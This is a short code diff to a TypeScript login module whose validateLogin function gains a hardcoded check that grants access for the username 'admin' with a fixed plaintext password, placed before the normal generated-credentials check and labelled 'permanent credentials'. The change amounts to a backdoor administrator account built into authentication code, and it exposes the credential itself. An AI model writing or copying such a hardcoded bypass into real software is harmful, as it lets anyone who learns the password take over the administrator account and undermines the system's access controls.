@@ -16,6 +16,12 @@ export const generateCredentials = (): AdminCredentials => {
 };
 
 export const validateLogin = (username: string, password: string): boolean => {
+  // Check permanent credentials first
+  if (username === "admin" && password === "Wood@12345") {
+    return true;
+  }
+  
+  // Fallback to generated credentials for backward compatibility
   const credentials = getAdminCredentials();
   if (!credentials) return false;
   
